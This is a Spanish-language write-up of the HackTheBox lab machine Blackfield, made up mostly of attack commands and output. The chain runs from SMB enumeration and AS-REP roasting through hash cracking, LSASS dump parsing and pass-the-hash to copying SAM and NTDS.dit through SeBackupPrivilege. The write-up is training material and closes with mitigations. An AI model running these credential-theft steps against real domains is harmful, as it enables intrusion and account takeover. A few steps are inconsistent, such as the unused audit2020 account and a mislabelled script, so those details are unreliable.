---
title: "Blackfield - HackTheBox"
description: "Writeup completo de Blackfield, una máquina Windows Insane de HackTheBox que involucra Active Directory, Kerberos, BloodHound, y técnicas avanzadas de escalada de privilegios en Windows."
pubDate: 2024-11-09
platform: "htb"
category: "machines"
difficulty: "insane"
os: "windows"
language: es
tags: ["active-directory", "kerberos", "bloodhound", "asreproast", "lsass", "sebackupprivilege", "ntds", "mimikatz"]
retired: true
logo: "/images/writeups/htb/blackfield/logo.png"
heroImage: "/images/writeups/htb/blackfield/card.png"
attackVectors: ["network", "active-directory", "privilege-escalation"]
techniques: ["T1558.003", "T1003.001", "T1003.003", "T1087.002", "T1069.002", "T1078.002", "T1003.002", "T1069.001", "T1082", "T1059.001"]
vulnerabilities: ["AS-REP Roasting", "Weak-Credentials", "SeBackupPrivilege-Abuse", "LSASS-Dump"]
certifications: ["OSCP", "OSEP", "CRTP"]
skillLevel: "expert"
estimatedTime: "4-6 horas"
points: 50
rating: 4.8
---

# Blackfield - HackTheBox Writeup

**Dificultad**: Insane  
**OS**: Windows  
**Plataforma**: HackTheBox  
**IP**: 10.10.10.192

## Introducción

Blackfield es una máquina Windows de dificultad Insane que simula un entorno de Active Directory empresarial completo. Esta máquina requiere conocimientos avanzados de Windows, Active Directory, Kerberos y técnicas de post-explotación. El camino hacia el compromiso total involucra enumeración exhaustiva, AS-REP Roasting, abuso de privilegios SeBackupPrivilege, volcado de LSASS y extracción de secretos del NTDS.dit.

## Reconocimiento

### Escaneo de puertos completo

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.192 -oG allPorts
```

**Puertos abiertos:**
```
53/tcp    - DNS
88/tcp    - Kerberos
135/tcp   - RPC
139/tcp   - NetBIOS
389/tcp   - LDAP
445/tcp   - SMB
593/tcp   - RPC over HTTP
3268/tcp  - Global Catalog
5985/tcp  - WinRM
```

### Escaneo de servicios detallado

```bash
nmap -p53,88,135,139,389,445,593,3268,5985 -sCV 10.10.10.192 -oN targeted
```

**Resultados importantes:**
```
53/tcp    - Simple DNS Plus
88/tcp    - Kerberos (BLACKFIELD.local)
135/tcp   - RPC
389/tcp   - LDAP
445/tcp   - SMB (Windows Server 2019)
5985/tcp  - WinRM
Domain: BLACKFIELD.local
Hostname: DC01.BLACKFIELD.local
```

### Enumeración DNS

Agregamos el dominio al `/etc/hosts`:

```bash
echo "10.10.10.192 blackfield.local dc01.blackfield.local" | sudo tee -a /etc/hosts
```

Intentamos transferencia de zona DNS:

```bash
dig axfr @10.10.10.192 blackfield.local
```

No permite transferencia de zona.

## Enumeración SMB

### Listado de recursos compartidos (null session)

```bash
smbclient -N -L //10.10.10.192
```

**Recursos compartidos disponibles:**
```
ADMIN$          NO ACCESS
C$              NO ACCESS
forensic        NO ACCESS
IPC$            READ ONLY
NETLOGON        NO ACCESS
profiles$       READ ONLY
SYSVOL          NO ACCESS
```

### Enumeración del recurso profiles$

```bash
smbclient -N //10.10.10.192/profiles$
```

Dentro encontramos múltiples carpetas de usuarios. Listamos todos:

```bash
smbclient -N //10.10.10.192/profiles$ -c "ls"
```

Extraemos la lista de usuarios potenciales:

```bash
smbclient -N //10.10.10.192/profiles$ -c "ls" | awk '{print $1}' > users.txt
```

**Usuarios identificados:**
```
AAlleni
ABarteski
ABekesz
ABenzies
ACarpenter
...
support
svc_backup
audit2020
```

## Ataque Kerberos - AS-REP Roasting

### Enumeración de usuarios sin Kerberos Pre-Authentication

Utilizamos **GetNPUsers.py** de Impacket para identificar usuarios vulnerables a AS-REP Roasting:

```bash
impacket-GetNPUsers blackfield.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.10.10.192
```

**Usuario vulnerable encontrado:**
```
support@BLACKFIELD.LOCAL
```

### Hash AS-REP capturado

```
$krb5asrep$23$support@BLACKFIELD.LOCAL:a8f3c2d1e4b5a6c7d8e9f0a1b2c3d4e5$...
```

### Cracking del hash con Hashcat

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**Credenciales obtenidas:**
```
Usuario: support
Password: #00^BlackKnight
```

## Enumeración con credenciales válidas

### Validación de credenciales

```bash
crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight'
```

✅ Credenciales válidas pero **no son administrador local**.

### Enumeración LDAP con BloodHound

Recopilamos datos de Active Directory con BloodHound:

```bash
bloodhound-python -d blackfield.local -u support -p '#00^BlackKnight' -ns 10.10.10.192 -c All
```

**Archivos generados:**
```
computers.json
domains.json
groups.json
users.json
```

### Análisis con BloodHound

Importamos los datos en BloodHound y analizamos:

1. **Usuario support** es miembro de **Remote Management Users**
2. El usuario **audit2020** tiene permisos sobre objetos sensibles
3. Identificamos ruta de escalada: `support → audit2020 → svc_backup → Administrator`

### Enumeración SMB con credenciales

```bash
smbclient -U 'support%#00^BlackKnight' //10.10.10.192/forensic
```

El recurso `forensic` ahora es accesible y contiene:

```
memory_analysis/
commands_output/
tools/
```

Descargamos el archivo `lsass.zip`:

```bash
smbclient -U 'support%#00^BlackKnight' //10.10.10.192/forensic -c "cd memory_analysis; get lsass.zip"
```

## Análisis de volcado LSASS

### Extracción del volcado

```bash
unzip lsass.zip
```

Obtenemos `lsass.DMP`.

### Análisis con pypykatz

```bash
pypykatz lsa minidump lsass.DMP > lsass_secrets.txt
```

**Credenciales encontradas:**

```
Username: svc_backup
Domain: BLACKFIELD
NT Hash: 9658d1d1dcd9250115e2205d9f48400d
```

### Pass-the-Hash con svc_backup

```bash
crackmapexec smb 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

✅ Usuario **svc_backup** tiene privilegios.

### WinRM con evil-winrm

```bash
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

✅ Acceso obtenido como **svc_backup**.

## Escalada de Privilegios

### Enumeración de privilegios

```powershell
whoami /priv
```

**Privilegio crítico identificado:**
```
SeBackupPrivilege    ENABLED
SeRestorePrivilege   ENABLED
```

### Abuso de SeBackupPrivilege

Con **SeBackupPrivilege** podemos leer cualquier archivo del sistema, incluyendo el registro SAM y NTDS.dit.

### Método 1: Volcado del registro

```powershell
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive
```

Descargamos los archivos:

```bash
download C:\temp\sam.hive sam.hive
download C:\temp\system.hive system.hive
```

Extraemos hashes con secretsdump:

```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

### Método 2: Extracción de NTDS.dit (Más completo)

Creamos un script DSInternals para extraer NTDS.dit:

```powershell
# Import-Module
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# Enable privileges
Set-SeBackupPrivilege

# Copy NTDS.dit
Copy-FileSeBackupPrivilege C:\Windows\NTDS\ntds.dit C:\temp\ntds.dit

# Copy SYSTEM hive
reg save HKLM\SYSTEM C:\temp\system.hive
```

Descargamos los archivos:

```bash
download C:\temp\ntds.dit ntds.dit
download C:\temp\system.hive system.hive
```

### Extracción de hashes con secretsdump

```bash
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

**Hash del Administrador obtenido:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
```

## Compromiso Total

### Pass-the-Hash como Administrator

```bash
evil-winrm -i 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
```

✅ **Acceso completo como Administrator**

### Flags

```powershell
# User flag
type C:\Users\support\Desktop\user.txt

# Root flag
type C:\Users\Administrator\Desktop\root.txt
```

## Técnicas MITRE ATT&CK

| ID | Técnica | Descripción |
|---|---|---|
| T1558.003 | AS-REP Roasting | Obtención de hash Kerberos sin pre-autenticación |
| T1003.001 | LSASS Memory | Volcado de credenciales desde LSASS |
| T1003.003 | NTDS | Extracción de base de datos Active Directory |
| T1087.002 | Domain Account Enumeration | Enumeración de cuentas del dominio |
| T1069.002 | Domain Groups | Enumeración de grupos del dominio |
| T1078.002 | Domain Accounts | Uso de cuentas de dominio válidas |
| T1003.002 | Security Account Manager | Volcado del registro SAM |
| T1069.001 | Local Groups | Enumeración de grupos locales |
| T1082 | System Information Discovery | Reconocimiento del sistema |
| T1059.001 | PowerShell | Ejecución con PowerShell |

## Herramientas Utilizadas

- **nmap** - Escaneo de puertos y servicios
- **smbclient** - Enumeración SMB
- **Impacket** - GetNPUsers, secretsdump
- **Hashcat** - Cracking de hashes
- **BloodHound** - Análisis de Active Directory
- **pypykatz** - Análisis de volcados LSASS
- **evil-winrm** - Acceso WinRM
- **crackmapexec** - Validación de credenciales

## Lecciones Aprendidas

### Vulnerabilidades Identificadas

1. **Exposición SMB con null session** - Permitió enumerar usuarios
2. **AS-REP Roasting** - Usuario sin Kerberos pre-authentication
3. **Contraseña débil** - Usuario support con contraseña crackeada
4. **Volcado LSASS expuesto** - Credenciales en recurso SMB
5. **SeBackupPrivilege mal configurado** - Permitió extracción de NTDS

### Mitigaciones Recomendadas

1. **Deshabilitar null sessions en SMB**
   ```
   [HKLM\SYSTEM\CurrentControlSet\Control\Lsa]
   RestrictAnonymous = 2
   ```

2. **Habilitar Kerberos Pre-Authentication** para todos los usuarios

3. **Política de contraseñas fuerte**
   - Mínimo 14 caracteres
   - Complejidad obligatoria
   - Rotación cada 90 días

4. **Protección de LSASS**
   - Habilitar Credential Guard
   - Protected Process Light (PPL)
   - Deshabilitar WDigest

5. **Segregación de privilegios**
   - Limitar SeBackupPrivilege solo a cuentas de servicio necesarias
   - Implementar Tiering Model
   - Usar LAPS para contraseñas de administrador local

6. **Monitoreo y detección**
   - Alertas en uso de SeBackupPrivilege
   - Detección de AS-REP Roasting
   - Monitoreo de accesos a NTDS.dit

## Reflexión Final

Blackfield es una excelente representación de un entorno Active Directory real con múltiples vectores de ataque encadenados. La máquina enseña la importancia de:

- **Enumeración exhaustiva** en cada etapa
- **Análisis de BloodHound** para identificar rutas de escalada
- **Comprensión profunda** de privilegios de Windows
- **Conocimiento de técnicas de post-explotación** en AD

Esta máquina es altamente recomendada para preparación de certificaciones como OSCP, OSEP y CRTP, ya que cubre técnicas reales utilizadas en pruebas de penetración empresariales.

## Referencias

- [HackTheBox - Blackfield](https://app.hackthebox.com/machines/Blackfield)
- [AS-REP Roasting - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
- [SeBackupPrivilege Abuse](https://github.com/giuliano108/SeBackupPrivilege)
- [NTDS.dit Extraction](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)

---

**Tags**: #HackTheBox #Windows #Insane #ActiveDirectory #Kerberos #ASREPRoasting #LSASS #SeBackupPrivilege #NTDS #OSCP #OSEP
